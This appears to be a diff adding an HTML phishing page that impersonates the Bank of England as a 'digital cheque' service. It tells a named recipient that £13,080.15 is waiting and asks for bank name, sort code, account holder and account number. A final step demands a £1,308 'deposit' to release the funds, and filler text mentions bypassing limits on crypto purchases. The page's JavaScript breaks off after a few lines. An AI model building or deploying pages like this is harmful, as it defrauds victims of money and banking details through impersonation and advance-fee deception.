@@ -1,0 +1,1309 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
+    <title>Bank of England · Digital Cheque System | Professional Banking Interface</title>
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
+    <style>
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --boe-navy-100: #f0f6ff;
+            --boe-navy-200: #d9e6ff;
+            --boe-navy-300: #a9c9ff;
+            --boe-navy-400: #5f8fd9;
+            --boe-navy-500: #1e4a7a;
+            --boe-navy-600: #10355e;
+            --boe-navy-700: #0a2647;
+            --boe-navy-800: #071b36;
+            --boe-navy-900: #030f1f;
+            --boe-navy-950: #010a15;
+            
+            --accent-blue: #2b6c9e;
+            --accent-glow: #3182ce;
+            --accent-emerald: #0f7b4b;
+            --accent-emerald-light: #10b981;
+            --accent-amber: #f5b342;
+            --accent-coral: #ef4444;
+            
+            --text-primary: #ffffff;
+            --text-secondary: #e0e9ff;
+            --text-tertiary: #b0c8f0;
+            --text-muted: #8da4cc;
+            
+            --glass-bg: rgba(3, 15, 31, 0.7);
+            --glass-bg-dark: rgba(1, 10, 21, 0.85);
+            --glass-border: rgba(95, 143, 217, 0.2);
+            --glass-border-strong: rgba(95, 143, 217, 0.4);
+            
+            --shadow-elevation-1: 0 4px 12px rgba(0, 0, 0, 0.5), 0 1px 2px rgba(0, 40, 80, 0.3);
+            --shadow-elevation-2: 0 8px 24px rgba(0, 0, 0, 0.6), 0 2px 4px rgba(0, 60, 120, 0.4);
+            --shadow-elevation-3: 0 20px 48px -12px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(49, 130, 206, 0.2) inset;
+            
+            --radius-xs: 12px;
+            --radius-sm: 18px;
+            --radius-md: 24px;
+            --radius-lg: 32px;
+            --radius-xl: 48px;
+            --radius-full: 60px;
+            
+            --transition-standard: all 0.2s cubic-bezier(0.2, 0.9, 0.4, 1);
+            --transition-smooth: all 0.3s cubic-bezier(0.3, 0.8, 0.4, 1);
+            
+            --font-sans: 'Inter', -apple-system, BlinkMacSystemFont, system-ui, sans-serif;
+        }
+
+        body {
+            background: var(--boe-navy-950);
+            background-image: radial-gradient(circle at 100% 0%, rgba(30, 74, 122, 0.15) 0%, transparent 50%),
+                              radial-gradient(circle at 0% 100%, rgba(16, 185, 129, 0.08) 0%, transparent 50%),
+                              linear-gradient(145deg, var(--boe-navy-950) 0%, var(--boe-navy-900) 100%);
+            font-family: var(--font-sans);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: clamp(12px, 3vw, 32px);
+            color: var(--text-primary);
+            line-height: 1.5;
+            -webkit-font-smoothing: antialiased;
+            font-weight: 400;
+        }
+
+        .card {
+            width: 100%;
+            max-width: 1280px;
+            background: var(--glass-bg);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            border: 1px solid var(--glass-border);
+            border-radius: var(--radius-xl);
+            box-shadow: var(--shadow-elevation-3);
+            overflow: hidden;
+        }
+
+        .card__inner {
+            padding: clamp(24px, 5vw, 56px);
+        }
+
+        
+        .logo-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 32px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid var(--glass-border-strong);
+        }
+        
+        .logo-boe {
+            max-width: 280px;
+            width: 100%;
+            height: auto;
+            filter: drop-shadow(0 8px 16px rgba(0,40,80,0.8));
+            transition: var(--transition-standard);
+        }
+        
+        .logo-boe:hover {
+            transform: scale(1.02);
+            filter: drop-shadow(0 12px 24px rgba(49,130,206,0.4));
+        }
+
+        .logo-fallback {
+            font-size: 2rem;
+            font-weight: 700;
+            color: white;
+            background: rgba(30,74,122,0.8);
+            padding: 15px 40px;
+            border-radius: 60px;
+            border: 2px solid var(--accent-glow);
+        }
+
+        
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(3, 15, 31, 0.98);
+            backdrop-filter: blur(10px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+            padding: 15px;
+            pointer-events: none;
+        }
+
+        .loading-overlay.active {
+            opacity: 1;
+            visibility: visible;
+            pointer-events: all;
+        }
+
+        
+        .loading-content {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(0.9);
+            max-width: 500px;
+            width: 95%;
+            margin: 0 auto;
+            padding: 45px 35px;
+            text-align: center;
+            background: rgba(10, 28, 50, 0.98);
+            border: 2px solid var(--accent-glow);
+            border-radius: var(--radius-xl);
+            box-shadow: 0 30px 60px -15px rgba(0, 0, 0, 0.9), 0 0 0 2px rgba(49, 130, 206, 0.5) inset;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            animation: popInCenter 0.4s ease forwards;
+            z-index: 10000;
+        }
+
+        @keyframes popInCenter {
+            0% {
+                opacity: 0;
+                transform: translate(-50%, -50%) scale(0.8);
+            }
+            100% {
+                opacity: 1;
+                transform: translate(-50%, -50%) scale(1);
+            }
+        }
+
+        .loading-logo {
+            width: 200px;
+            max-width: 85%;
+            height: auto;
+            margin-bottom: 35px;
+            filter: drop-shadow(0 8px 25px rgba(49,130,206,0.6));
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+
+        .loading-spinner-large {
+            display: inline-block;
+            width: 80px;
+            height: 80px;
+            border: 6px solid rgba(49, 130, 206, 0.2);
+            border-top-color: var(--accent-glow);
+            border-right-color: var(--accent-glow);
+            border-bottom-color: var(--accent-glow);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 35px;
+        }
+
+        .loading-text {
+            color: var(--text-primary);
+            font-size: 2.2rem;
+            font-weight: 700;
+            margin-bottom: 18px;
+            background: linear-gradient(135deg, #ffffff, var(--accent-glow));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: -0.5px;
+        }
+
+        .loading-subtext {
+            color: var(--text-tertiary);
+            font-size: 1.2rem;
+            letter-spacing: 0.3px;
+            max-width: 350px;
+            margin: 0 auto;
+            line-height: 1.5;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.05); opacity: 0.9; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        @keyframes spin { 
+            to { transform: rotate(360deg); } 
+        }
+
+        
+        @media (max-width: 600px) {
+            .loading-content {
+                padding: 35px 25px;
+                max-width: 400px;
+            }
+            
+            .loading-logo {
+                width: 160px;
+                margin-bottom: 30px;
+            }
+            
+            .loading-spinner-large {
+                width: 70px;
+                height: 70px;
+                border-width: 5px;
+                margin-bottom: 30px;
+            }
+            
+            .loading-text {
+                font-size: 1.8rem;
+            }
+            
+            .loading-subtext {
+                font-size: 1.1rem;
+            }
+        }
+
+        @media (max-width: 400px) {
+            .loading-content {
+                padding: 25px 20px;
+                width: 90%;
+            }
+            
+            .loading-logo {
+                width: 140px;
+                margin-bottom: 25px;
+            }
+            
+            .loading-spinner-large {
+                width: 60px;
+                height: 60px;
+                margin-bottom: 25px;
+            }
+            
+            .loading-text {
+                font-size: 1.5rem;
+            }
+            
+            .loading-subtext {
+                font-size: 1rem;
+            }
+        }
+
+        
+        .overline {
+            font-size: clamp(0.7rem, 1.2vw, 0.8rem);
+            font-weight: 600;
+            letter-spacing: 0.12em;
+            text-transform: uppercase;
+            color: var(--text-tertiary);
+            background: rgba(49, 130, 206, 0.1);
+            padding: 6px 18px;
+            border-radius: var(--radius-full);
+            border: 1px solid rgba(49, 130, 206, 0.2);
+            display: inline-block;
+            backdrop-filter: blur(8px);
+        }
+
+        h1 {
+            font-size: clamp(2.2rem, 6vw, 3.8rem);
+            font-weight: 600;
+            letter-spacing: -0.02em;
+            background: linear-gradient(135deg, #ffffff 0%, var(--text-secondary) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            line-height: 1.2;
+            margin: 16px 0 8px;
+        }
+
+        h2 {
+            font-size: clamp(1.6rem, 4vw, 2.4rem);
+            font-weight: 600;
+            letter-spacing: -0.01em;
+            color: var(--text-primary);
+        }
+
+        h3 {
+            font-size: clamp(1.2rem, 2.5vw, 1.6rem);
+            font-weight: 500;
+            color: var(--text-secondary);
+        }
+
+        .body-text {
+            font-size: clamp(0.95rem, 1.8vw, 1.1rem);
+            color: var(--text-tertiary);
+            max-width: 72ch;
+        }
+
+        
+        .progress {
+            display: flex;
+            gap: 6px;
+            background: rgba(0, 0, 0, 0.35);
+            backdrop-filter: blur(12px);
+            padding: 6px;
+            border-radius: var(--radius-full);
+            border: 1px solid var(--glass-border-strong);
+            margin: 32px 0 36px;
+        }
+
+        .progress__step {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            padding: 14px 8px;
+            border-radius: var(--radius-full);
+            font-weight: 600;
+            font-size: clamp(0.8rem, 1.5vw, 0.95rem);
+            color: var(--text-muted);
+            transition: var(--transition-standard);
+            white-space: nowrap;
+        }
+
+        @media (max-width: 480px) {
+            .progress__step span:not(.progress__marker) { display: none; }
+        }
+
+        .progress__step--active {
+            background: linear-gradient(145deg, var(--boe-navy-500), var(--boe-navy-700));
+            color: white;
+            box-shadow: 0 6px 18px -8px var(--accent-glow);
+        }
+
+        .progress__step--completed {
+            color: var(--accent-emerald-light);
+        }
+
+        .progress__marker {
+            width: 32px;
+            height: 32px;
+            border-radius: var(--radius-full);
+            background: rgba(255, 255, 255, 0.06);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 0.9rem;
+        }
+
+        .progress__step--completed .progress__marker {
+            background: rgba(16, 185, 129, 0.15);
+            color: var(--accent-emerald-light);
+        }
+
+        
+        .form-group {
+            margin-bottom: 28px;
+        }
+
+        .form__label {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 0.7rem;
+            font-weight: 600;
+            letter-spacing: 0.05em;
+            text-transform: uppercase;
+            color: var(--text-tertiary);
+            padding-left: 10px;
+            margin-bottom: 6px;
+        }
+
+        .form__control {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.45);
+            border: 1.5px solid var(--glass-border-strong);
+            border-radius: var(--radius-full);
+            padding: 18px 26px;
+            font-size: 1rem;
+            color: var(--text-primary);
+            transition: var(--transition-standard);
+            backdrop-filter: blur(10px);
+            font-family: var(--font-sans);
+        }
+
+        .form__control:hover {
+            border-color: var(--accent-glow);
+        }
+
+        .form__control:focus {
+            outline: none;
+            border-color: var(--accent-glow);
+            box-shadow: 0 0 0 4px rgba(49, 130, 206, 0.25);
+            background: rgba(0, 0, 0, 0.6);
+        }
+
+        .form__control--verified {
+            border-color: var(--accent-emerald-light);
+            background: rgba(16, 185, 129, 0.08);
+        }
+
+        .badge {
+            display: inline-block;
+            padding: 4px 14px;
+            border-radius: var(--radius-full);
+            font-size: 0.65rem;
+            font-weight: 700;
+            letter-spacing: 0.02em;
+            margin-left: 12px;
+            border: 1px solid transparent;
+        }
+
+        .badge--pending {
+            background: rgba(245, 180, 66, 0.15);
+            color: var(--accent-amber);
+            border-color: rgba(245, 180, 66, 0.3);
+        }
+
+        .badge--verified {
+            background: rgba(16, 185, 129, 0.15);
+            color: var(--accent-emerald-light);
+            border-color: rgba(16, 185, 129, 0.3);
+        }
+
+        
+        .custom-select {
+            position: relative;
+        }
+
+        .select__trigger {
+            background: rgba(0, 0, 0, 0.45);
+            border: 1.5px solid var(--glass-border-strong);
+            border-radius: var(--radius-full);
+            padding: 18px 26px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+            transition: var(--transition-standard);
+            backdrop-filter: blur(10px);
+        }
+
+        .select__trigger:hover {
+            border-color: var(--accent-glow);
+        }
+
+        .select__dropdown {
+            position: absolute;
+            top: calc(100% + 12px);
+            left: 0;
+            right: 0;
+            background: var(--boe-navy-800);
+            border: 1px solid var(--glass-border-strong);
+            border-radius: var(--radius-lg);
+            padding: 16px;
+            box-shadow: var(--shadow-elevation-3);
+            backdrop-filter: blur(24px);
+            opacity: 0;
+            visibility: hidden;
+            transform: translateY(-12px);
+            transition: var(--transition-smooth);
+            z-index: 100;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+
+        .select__dropdown.open {
+            opacity: 1;
+            visibility: visible;
+            transform: translateY(0);
+        }
+
+        .bank-option {
+            padding: 14px 20px;
+            border-radius: var(--radius-full);
+            cursor: pointer;
+            transition: var(--transition-standard);
+            margin: 4px 0;
+        }
+
+        .bank-option:hover {
+            background: rgba(49, 130, 206, 0.25);
+        }
+
+        .bank-option.selected {
+            background: var(--boe-navy-500);
+            color: white;
+            font-weight: 600;
+        }
+
+        
+        .gallery {
+            background: rgba(0, 0, 0, 0.25);
+            border-radius: var(--radius-lg);
+            padding: 20px;
+            border: 1px solid var(--glass-border-strong);
+            margin-top: 0;
+        }
+
+        .gallery__header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+            padding: 4px 0;
+        }
+
+        .gallery__items {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.4s ease-out;
+        }
+
+        .gallery__items.expanded {
+            max-height: 350px;
+        }
+
+        .gallery__row {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            background: rgba(0, 0, 0, 0.35);
+            border-radius: var(--radius-full);
+            padding: 12px 20px;
+            margin-top: 12px;
+            border: 1px solid var(--glass-border);
+        }
+
+        .status-dot {
+            width: 34px;
+            height: 34px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.08);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1rem;
+            transition: var(--transition-standard);
+        }
+
+        .status-dot.verified {
+            background: var(--accent-emerald);
+            color: white;
+            box-shadow: 0 0 18px var(--accent-emerald-light);
+        }
+
+        
+        .summary {
+            background: rgba(0, 0, 0, 0.4);
+            backdrop-filter: blur(16px);
+            border-radius: var(--radius-lg);
+            padding: 28px;
+            border: 1px solid var(--glass-border-strong);
+            margin-bottom: 28px;
+        }
+
+        .summary__row {
+            display: flex;
+            justify-content: space-between;
+            padding: 14px 0;
+            border-bottom: 1px solid rgba(95, 143, 217, 0.15);
+        }
+
+        .summary__value {
+            font-weight: 600;
+            background: rgba(49, 130, 206, 0.15);
+            padding: 6px 24px;
+            border-radius: var(--radius-full);
+            border: 1px solid rgba(49, 130, 206, 0.3);
+        }
+
+        .amount-display {
+            font-size: clamp(2.5rem, 7vw, 4rem);
+            font-weight: 700;
+            background: linear-gradient(135deg, #ffffff, var(--accent-glow));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            line-height: 1;
+        }
+
+        
+        .deposit-panel {
+            background: linear-gradient(145deg, #f5e6d3, #ecdcc0, #e3d1b0, #d9c6a0);
+            border-radius: var(--radius-lg);
+            padding: 32px;
+            border: 1px solid #c4a484;
+            box-shadow: 0 10px 30px -10px #c4a48480;
+        }
+
+        .required-amount {
+            font-size: 3.2rem;
+            font-weight: 700;
+            color: var(--boe-navy-700);
+            text-shadow: 0 2px 4px rgba(255,255,255,0.5);
+            margin: 12px 0;
+        }
+
+        .progress-bar-container {
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: var(--radius-full);
+            padding: 4px;
+            border: 1px solid var(--accent-amber);
+            margin: 28px 0;
+        }
+        
+        .progress-bar-fill {
+            height: 28px;
+            width: 90%;
+            background: linear-gradient(90deg, #f5b342, #ffd966);
+            border-radius: var(--radius-full);
+            box-shadow: 0 0 20px #f5b342;
+            display: flex;
+            align-items: center;
+            justify-content: flex-end;
+            padding-right: 20px;
+            color: #0a2647;
+            font-weight: 700;
+            font-size: 0.85rem;
+        }
+
+        
+        .details-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 16px;
+            margin: 24px 0;
+        }
+        
+        .detail-card {
+            background: rgba(0, 0, 0, 0.4);
+            backdrop-filter: blur(8px);
+            border-radius: var(--radius-lg);
+            padding: 18px;
+            border: 1px solid var(--glass-border-strong);
+            transition: var(--transition-standard);
+        }
+        
+        .detail-card:hover {
+            border-color: var(--accent-glow);
+            transform: translateY(-2px);
+        }
+        
+        .detail-label {
+            font-size: 0.7rem;
+            font-weight: 600;
+            letter-spacing: 0.05em;
+            text-transform: uppercase;
+            color: var(--text-tertiary);
+            margin-bottom: 8px;
+        }
+        
+        .detail-value {
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: var(--text-primary);
+            word-break: break-word;
+        }
+        
+        @media (max-width: 700px) {
+            .details-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+        
+        @media (max-width: 500px) {
+            .details-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        
+        .btn {
+            padding: 18px 40px;
+            border-radius: var(--radius-full);
+            font-weight: 600;
+            font-size: 1rem;
+            border: none;
+            cursor: pointer;
+            transition: var(--transition-standard);
+            background: transparent;
+            color: var(--text-primary);
+            border: 1px solid var(--glass-border-strong);
+            backdrop-filter: blur(10px);
+            white-space: nowrap;
+        }
+
+        .btn--primary {
+            background: linear-gradient(145deg, var(--boe-navy-500), var(--boe-navy-700));
+            border: none;
+            box-shadow: 0 8px 24px -10px var(--accent-glow);
+        }
+
+        .btn--primary:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 14px 30px -8px var(--accent-glow);
+        }
+
+        .btn--success {
+            background: linear-gradient(145deg, var(--accent-emerald), #0b5e3c);
+            border: none;
+            box-shadow: 0 8px 24px -10px var(--accent-emerald-light);
+        }
+
+        .btn--outline {
+            border: 1.5px solid rgba(49, 130, 206, 0.6);
+            background: rgba(0, 0, 0, 0.3);
+        }
+
+        .btn:disabled {
+            opacity: 0.35;
+            cursor: not-allowed;
+            filter: grayscale(0.6);
+        }
+
+        .btn-group {
+            display: flex;
+            gap: 16px;
+            flex-wrap: wrap;
+            margin: 32px 0 0;
+        }
+
+        
+        .grid-2 {
+            display: grid;
+            grid-template-columns: 1fr 1.2fr;
+            gap: 36px;
+        }
+
+        @media (max-width: 860px) {
+            .grid-2 { grid-template-columns: 1fr; }
+        }
+
+        .hidden { display: none !important; }
+        .text-center { text-align: center; }
+        .w-100 { width: 100%; }
+
+        .spinner {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255,255,255,0.2);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+        }
+
+        :focus-visible {
+            outline: 2px solid var(--accent-glow);
+            outline-offset: 2px;
+        }
+
+        .error-message {
+            color: var(--accent-coral);
+            font-size: 0.85rem;
+            margin-top: 5px;
+            padding-left: 15px;
+        }
+    </style>
+</head>
+<body>
+<div class="card">
+    <div class="card__inner">
+
+        
+        <div class="loading-overlay" id="loadingOverlay">
+            <div class="loading-content">
+                <img src="logob.png" alt="Bank of England" class="loading-logo" onerror="this.onerror=null; this.src=''; this.outerHTML='<div class=\'loading-logo\' style=\'font-size:2rem; color:white;\'>BANK OF ENGLAND</div>';">
+                <div class="loading-spinner-large"></div>
+                <div class="loading-text">Processing Transfer</div>
+                <div class="loading-subtext">Please wait while we secure your transaction...</div>
+            </div>
+        </div>
+
+        <div class="logo-container">
+            <img src="logob.png" alt="Bank of England" class="logo-boe" onerror="this.onerror=null; this.style.display='none'; this.insertAdjacentHTML('afterend', '<div class=\'logo-fallback\'>BANK OF ENGLAND</div>');">
+        </div>
+
+        <section id="section-1" class="section">
+            <div class="text-center">
+                <span class="overline">BANK OF ENGLAND • DIGITAL CHEQUE</span>
+                <h1>Bank Of England Cheque to John Hinton</h1>
+                <p class="body-text" style="margin:0 auto;">Seamlessly confirm the receiving account, run built‑in security checks, and monitor the final release of funds.</p>
+            </div>
+
+            <div style="background: rgba(0,0,0,0.3); border-radius: var(--radius-lg); padding: 32px; margin: 40px 0; border:1px solid var(--glass-border);">
+                <div style="color: var(--text-tertiary); font-weight:500; letter-spacing:0.5px;">INCOMING AMOUNT</div>
+                <div class="amount-display">£13,080.15</div>
+                <div style="color: var(--text-muted); margin-top: 8px;">Funds earmarked for release once the receiving credentials are validated.</div>
+            </div>
+
+            <div style="display: flex; gap: 24px; flex-wrap: wrap; margin: 32px 0; color: var(--text-secondary);">
+                <div><span style="font-weight:700;">1.</span> Cheque overview — Review the high‑level details</div>
+                <div><span style="font-weight:700;">2.</span> Verify recipient — Confirm the destination account</div>
+                <div><span style="font-weight:700;">3.</span> Deposit status — Track funds release & fraud prevention</div>
+            </div>
+
+            <div style="background: rgba(10, 28, 50, 0.7); border-radius: var(--radius-lg); padding: 28px; border:1px solid var(--glass-border-strong);">
+                <div style="display:flex; align-items:center; gap:20px; flex-wrap:wrap;">
+                    <span class="overline" style="background:var(--boe-navy-500); color:white; border:none;">STEP 1 OF 3</span>
+                    <span style="font-weight:500;">Online Cheque from Bank Of England to John Hinton</span>
+                </div>
+                <p style="margin: 20px 0; color: var(--text-secondary);">Review the cheque details before we prompt you for the receiving credentials.</p>
+                <div style="display:flex; gap: 48px; color: var(--text-tertiary);">
+                    <span>CURRENT BALANCE £13,080.15</span>
+                    <span>CHEQUE ID ••• 8420</span>
+                </div>
+            </div>
+
+            <button class="btn btn--primary w-100" id="goToStep2" style="margin-top: 36px;">Proceed to verification</button>
+        </section>
+
+        <section id="section-2" class="section hidden">
+            <div class="progress">
+                <div class="progress__step progress__step--completed"><span class="progress__marker">✓</span> <span>Cheque overview</span></div>
+                <div class="progress__step progress__step--active"><span class="progress__marker">2</span> <span>Verify recipient</span></div>
+                <div class="progress__step"><span class="progress__marker">3</span> <span>Deposit status</span></div>
+            </div>
+
+            <h2>Verify the receiving account</h2>
+            <p class="body-text" style="margin-bottom: 32px;">We only release funds to verified details. Confirm the account information exactly as it appears with your bank.</p>
+
+            <div class="grid-2">
+                <div>
+                    <div class="summary">
+                        <h3 style="margin-bottom: 20px;">Receiving summary</h3>
+                        <div class="summary__row"><span>Bank</span><span class="summary__value" id="sumBank">-</span></div>
+                        <div class="summary__row"><span>Sort code</span><span class="summary__value" id="sumSort">-</span></div>
+                        <div class="summary__row"><span>Account holder</span><span class="summary__value" id="sumHolder">-</span></div>
+                        <div class="summary__row"><span>Account number</span><span class="summary__value" id="sumAcc">-</span></div>
+                    </div>
+                    <div style="margin-top: 28px; background: rgba(0,0,0,0.3); border-radius: var(--radius-lg); padding: 28px;">
+                        <div style="color: var(--text-tertiary);">TRANSFER AMOUNT</div>
+                        <div class="amount-display" style="font-size:2.8rem;">£13,080.15</div>
+                    </div>
+                </div>
+
+                <div>
+                    <div class="form-group">
+                        <div class="form__label"><span>🏦</span> RECEIVING BANK <span id="badgeBank" class="badge badge--pending">Pending</span></div>
+                        <div class="custom-select" id="bankSelect">
+                            <div class="select__trigger" id="bankTrigger">
+                                <span id="selectedBank">Select bank</span>
+                                <span style="font-size:1.4rem;">⌄</span>
+                            </div>
+                            <div class="select__dropdown" id="bankDropdown">
+                                <input type="text" id="bankSearch" placeholder="Search bank..." style="width:100%; padding:14px 18px; border-radius:60px; background:var(--boe-navy-900); border:1px solid var(--glass-border); color:white; margin-bottom:12px;">
+                                <div class="bank-option" data-bank="NatWest">NatWest</div>
+                                <div class="bank-option" data-bank="Barclays">Barclays</div>
+                                <div class="bank-option" data-bank="HSBC UK">HSBC UK</div>
+                                <div class="bank-option" data-bank="Lloyds">Lloyds</div>
+                                <div class="bank-option" data-bank="Santander">Santander</div>
+                                <div class="bank-option" data-bank="Nationwide">Nationwide</div>
+                                <div class="bank-option" data-bank="Revolut">Revolut</div>
+                                <div class="bank-option" data-bank="Monzo">Monzo</div>
+                                <div class="bank-option" data-bank="Starling">Starling</div>
+                                <div class="bank-option" data-bank="TSB">TSB</div>
+                                <div class="bank-option" data-bank="Virgin Money">Virgin Money</div>
+                                <div class="bank-option" data-bank="Co-operative Bank">Co-operative Bank</div>
+                                <div class="bank-option" data-bank="Clydesdale">Clydesdale</div>
+                                <div class="bank-option" data-bank="Ulster Bank">Ulster Bank</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <div class="form__label"><span>🔀</span> SWIFT / SORT CODE <span id="badgeSort" class="badge badge--pending">Pending</span></div>
+                        <input class="form__control" id="sortCode" maxlength="8" placeholder="00-00-00" value="">
+                    </div>
+
+                    <div class="form-group">
+                        <div class="form__label"><span>👤</span> ACCOUNT HOLDER NAME <span id="badgeHolder" class="badge badge--pending">Pending</span></div>
+                        <input class="form__control" id="holderName" value="">
+                    </div>
+
+                    <div class="form-group">
+                        <div class="form__label"><span>💳</span> ACCOUNT NUMBER <span id="badgeAcc" class="badge badge--pending">Pending</span></div>
+                        <input class="form__control" id="accountNumber" maxlength="8" value="">
+                    </div>
+
+                    <div id="verifiedMessage" style="color: var(--accent-emerald-light); margin: 16px 0 24px; display: none;">✔ Account Number Verified</div>
+
+                    <div class="gallery">
+                        <div class="gallery__header" id="galleryHeader">
+                            <span style="font-weight:500;">🔍 Live verification status</span>
+                            <span style="font-size:1.6rem;" id="galleryChevron">⌄</span>
+                        </div>
+                        <div class="gallery__items expanded" id="galleryItems">
+                            <div class="gallery__row"><span class="status-dot" id="iconBank">○</span> <span style="flex:1;">Bank</span> <span id="gBank">-</span></div>
+                            <div class="gallery__row"><span class="status-dot" id="iconSort">○</span> <span style="flex:1;">Sort code</span> <span id="gSort">-</span></div>
+                            <div class="gallery__row"><span class="status-dot" id="iconHolder">○</span> <span style="flex:1;">Holder</span> <span id="gHolder">-</span></div>
+                            <div class="gallery__row"><span class="status-dot" id="iconAcc">○</span> <span style="flex:1;">Account</span> <span id="gAcc">-</span></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="btn-group">
+                <button class="btn btn--outline" id="backToStep1">← Back</button>
+                <button class="btn btn--primary" id="runVerification">Run Verification</button>
+                <button class="btn btn--success" id="confirmStep2" disabled>Confirm →</button>
+            </div>
+        </section>
+
+        <section id="section-3" class="section hidden">
+            <div class="progress">
+                <div class="progress__step progress__step--completed"><span class="progress__marker">✓</span> <span>Overview</span></div>
+                <div class="progress__step progress__step--completed"><span class="progress__marker">✓</span> <span>Verify</span></div>
+                <div class="progress__step progress__step--active"><span class="progress__marker">3</span> <span>Deposit status</span></div>
+            </div>
+
+            <span class="overline" style="background:var(--boe-navy-500); color:white;">STEP 3 OF 3</span>
+            <h2 style="margin: 20px 0 12px;">Transfer Paused – Action Required</h2>
+            <p class="body-text">The transfer is almost complete. Provide the required deposit to unlock funds and finalize the release to the recipient bank.</p>
+
+            <div class="deposit-panel">
+                <div style="color: var(--boe-navy-700); font-weight:600;">DEPOSIT STATUS</div>
+                <div class="required-amount">Deposit Required - £1,308.00 </div>
+                
+                <div class="progress-bar-container">
+                    <div class="progress-bar-fill">90% ready</div>
+                </div>
+
+                
+                    <p style="margin-bottom: 15px; color: var(--boe-navy-800);"><strong>Bank deposit delayed because client deposit is required to trigger the release of funds.</strong></p>
+
+<p style="margin-bottom: 15px; color: var(--boe-navy-800);"><strong>Security and Fraud Prevention:</strong> Online cheque transfers can offer additional layers of security and fraud prevention. Banks often have rigorous security measures that protect against unauthorized transactions and ensure the legitimacy of large transfers.</p>
+
+<p style="margin-bottom: 0; color: var(--boe-navy-800);"><strong>Transactional Limits:</strong> Some exchanges or financial institutions may have limits on direct crypto purchases. Transferring funds via an online cheque might be a necessary step to bypass these limits or to enable the purchase of larger amounts of cryptocurrency.</p>
+                
+            </div>
+
+            <h3 style="margin: 32px 0 8px;">RELEASE PROGRESS</h3>
+            <p style="color:var(--text-tertiary);">Deposit confirmation is the final checkpoint before funds arrive in the recipient account.</p>
+
+            <div class="details-grid">
+                <div class="detail-card">
+                    <div class="detail-label">RECEIVING BANK</div>
+                    <div class="detail-value" id="relBank">-</div>
+                </div>
+                <div class="detail-card">
+                    <div class="detail-label">SWIFT / SORT CODE</div>
+                    <div class="detail-value" id="relSort">-</div>
+                </div>
+                <div class="detail-card">
+                    <div class="detail-label">ACCOUNT NUMBER</div>
+                    <div class="detail-value" id="relAcc">-</div>
+                </div>
+                <div class="detail-card">
+                    <div class="detail-label">TRANSFER AMOUNT</div>
+                    <div class="detail-value">£13,080.15</div>
+                </div>
+                <div class="detail-card">
+                    <div class="detail-label">REFERENCE</div>
+                    <div class="detail-value">#Hinton-DEPOSIT</div>
+                </div>
+                <div class="detail-card">
+                    <div class="detail-label">SECURITY LAYER</div>
+                    <div class="detail-value">Fraud watch active</div>
+                </div>
+            </div>
+
+            <div style="background: rgba(0, 0, 0, 0.3); border-radius: var(--radius-lg); padding: 24px; margin: 24px 0; border: 1px solid var(--accent-glow);">
+                <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 12px;">
+                    <span style="font-size: 1.5rem;">🛡️</span>
+                    <h3 style="margin: 0; color: var(--text-primary);">Security & fraud prevention</h3>
+                </div>
+                <p style="color: var(--text-secondary); line-height: 1.6; margin: 0; font-size: 1rem;">
+                    Online cheque transfers include multi-factor verification and biometric confirmation to guard against unauthorized releases. Larger deposits may be subject to additional high-value screening.
+                </p>
+            </div>
+
+            <div class="btn-group">
+                <button class="btn btn--outline" id="backToStep2">← Modify Details</button>
+            </div>
+        </section>
+    </div>
+</div>
+
+<script>
+    (function(){
+        'use strict';
+
+        function scrollToCenter() {
+            const windowHeight = window.innerHeight;
